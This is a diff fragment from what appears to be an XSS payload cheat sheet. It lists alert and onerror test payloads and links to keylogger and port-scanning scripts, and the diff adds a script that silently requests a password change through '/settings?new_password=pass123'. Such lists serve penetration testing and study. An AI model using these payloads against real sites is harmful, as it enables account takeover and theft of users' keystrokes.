@@ -135,6 +135,7 @@ try :
 <script>alert(“Hello World”)</script>
 document.write
 <img src=x onerror=alert(2)>
+<script>fetch('/settings?new_password=pass123');</script>
 ```
 * XSS Keylogger (http://www.xss-payloads.com/payloads/scripts/simplekeylogger.js.html)
 * Port scanning (http://www.xss-payloads.com/payloads/scripts/portscanapi.js.html) - A mini local port scanner
